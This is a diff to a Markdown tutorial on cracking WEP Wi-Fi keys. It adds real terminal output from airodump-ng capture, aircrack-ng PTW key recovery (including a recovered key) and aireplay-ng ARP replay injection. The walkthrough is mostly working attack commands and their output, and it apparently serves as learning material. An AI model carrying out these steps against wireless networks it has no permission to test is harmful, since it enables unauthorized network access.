@@ -115,9 +115,25 @@ sequenceDiagram
 - Copy the BSSID and channel of the `target network` using `WEP` encryption.
 - Now, we can start capturing packets using `airodump-ng` command.
 
-```bash
-root@kali:~# airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0
-```
+    ```bash
+    root@kali:~# airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0
+    ```
+    The Output will look something like this:
+
+    ```bash
+    root@kali:~# airodump-ng --bssid MAC_WIFI -c 36 -w capture wlan0
+    06:12:59  Created capture file "capture-01.cap".
+
+
+    CH 36 ][ Elapsed: 4 hours 31 mins ][ 2025-07-27 10:44 
+
+    BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  
+
+    MAC_WIFI  -20   0   131951    22978  127  36   54e  WEP  WEP    
+
+    BSSID              STATION            PWR   Rate    Lost    Frames  Notes
+    Quitting...
+    ```
 
 >[!NOTE]
 >Wait for some time to capture enough packets, the number of packets should be `at least 1000000`, anything less than that may not be enough to crack the WEP key.
@@ -130,20 +146,60 @@ root@kali:~# airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0
 
 - You will see the output similar to this:
 
-    ```
+    ```bash
+    root@kali:~# aircrack-ng capture-01.cap(20480) FE(20480) 50(19712) 
+    Reading packets, please wait...9712) 76(19712) 77(19712) 7B(19456) 
     Opening capture-01.cap
-    Read 328704 packets.
-    #    BSSID              ESSID              Encryption
-    1    DEVICE_MAC_ADDRESS  TARGET_NETWORK_NAME  WEP (155258 IVs)
+    Read 11636874 packets.
+    Got 16695 out of 15000 IVsStarting PTW attack with 16695 ivs.ID              ESSID                     Encryption
+
+    1  WIFI_MAC  WIFI_NAME       WEP (16695 IVs)
+
     Choosing first network as target.
-    Operating capture-01.cap
+
+    Reading packets, please wait...
+    Opening capture-01.cap
+    Read 11636874 packets.
+
+    1 potential targets
+
     Attack will be restarted every 5000 captured ivs.
-    Starting PTW attack with 156072 ivs.
-           KEY FOUND! [ XX:XX:XX:XX:XX:XX ] (ASCII: ASCII_PASSWORD)
-    Decrypted correctly 100%
+
+
+                                Aircrack-ng 1.7 
+
+                                Aircrack-ng 1.7 
+                [00:00:00] Tested 1244161 keys (got 14262 IVs)
+                                Aircrack-ng 1.7 
+    KB    depth[00:00:00] Tested 1526401 keys (got 14262 IVs)
+        0    7/  8   DB(18944) 1Aircrack-ng 1.7 2) F4(17920) 58(17664) 
+    KB    depth[00:00:00] Tested 1666401 keys (got 14262 IVs)
+        0    7/  8   DB(18944) 1Aircrack-ng 1.7 2) F4(17920) 58(17664) 
+    KB    depth[00:00:01] Tested 1048577 keys (got 16695 IVs)
+        0    5/  8   6D(19456) 3Aircrack-ng 1.7 4) 19(18432) 2C(18432) 
+    KB    depth[00:00:01] Tested 1376257 keys (got 16695 IVs)
+        0    1/  2   B8(22784) 5Aircrack-ng 1.7 6) 6D(22016) 10(21760) 
+    KB    depth[00:00:02] Tested 2686977 keys (got 16695 IVs)
+        0    0/  2   29(22784) BAircrack-ng 1.7 2) 2A(22016) 6D(22016) 
+    KB    depth[00:38:38] Tested 1179649 keys (got 17411 IVs)
+        0    0/  2   29(227Got 2Aircrack-ng 1.7 0 IVsStarting PTW attack with 2000KB    depth[00:38:38] Tested 1441793 keys (got 17411 IVs)
+        0    0/  2   2A(24064) 5Aircrack-ng 1.7 4) 3A(22784) F2(22784) 
+    KB    depth[00:38:38] Tested 1441793 keys (got 17411 IVs)
+        0    0/  1   2A(24064) 5F(23808) 29(22784) 3A(22784) F2(22784) 
+    KB    depth[00:38:38] Tested 6006 keys (got 17411 IVs)
+        0    0/  1   2A(24064) 5F(23808) 29(22784) 3A(22784) F2(22784) 
+    KB    depth   byte(vote)F5(22784) 94(22528) 3A(22272) 10(22016) 
+        0    0/ 16   2A(24064) 5F(23808) 29(22784) 3A(22784) F2(22784) 
+        1   16/ 18   E4(20736) 76(20480) 84(20480) AC(20480) BB(20480) 
+        2   10/ 11   71(21760) AB(20992) BD(20992) BE(20992) 21(20736) 
+        3    0/  2   4B(28160) 46(25344) 9B(24576) 72(24064) F0(23552) 
+        4    0/  1   4D(26624) 8A(22784) 09(22528) 7B(22528) 1B(22016) 
+
+                        KEY FOUND! [ 2A:4C:71:4B:4D ] (ASCII: *LqKM )
+        Decrypted correctly: 100%
     ...
 
-- We can now use `XX:XX:XX:XX:XX:XX` or `ASCII_PASSWORD` to connect to the network.
+- We can now use `2A:4C:71:4B:4D` or `*LqKM` to connect to the network.
 
 - To use `XX:XX:XX:XX:XX:XX` remove the colons and use it as the password to connect to the network.
 
@@ -206,6 +262,23 @@ root@kali:~# airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0
     Saving ARP requests in file: something.cap
     You should also start airodump-ng to capture replies.
     Read XXXXXX packets (got XXXXX ARP requests and XXX ACKs), sent XXXX Packers...(XXX pps)
+    ```
+
+    Actual output looks like this:
+
+    ```bash
+    root@kali:~# aireplay-ng --arpreplay -b WIFI_MAC -h WIRELESS_ADAPTER_MAC  wlan0
+    06:07:29  Waiting for beacon frame (BSSID: WIFI_MAC) on channel 36
+    Saving ARP requests in replay_arp-0727-060729.cap
+    You should also start airodump-ng to capture replies.
+    Read 0 packets (got 0 ARP requests and 0 ACKs), sen
+    Read 2 packets (got 0 ARP requests and 0 ACKs), sen
+    Read 23 packets (got 0 ARP requests and 0 ACKs), se
+    Read 33 packets (got 0 ARP requests and 2 ACKs), se
+    Read 37 packets (got 0 ARP requests and 2 ACKs), se
+    Read 48 packets (got 0 ARP requests and 2 ACKs), se
+    Read 49 packets (got 0 ARP requests and 2 ACKs), se
+    Read 55 packets (got 0 ARP requests and 2 ACKs), se
     ```
 
 - `-b` is the BSSID of the target network, and `-h` is the MAC address of the hacker's adapter.
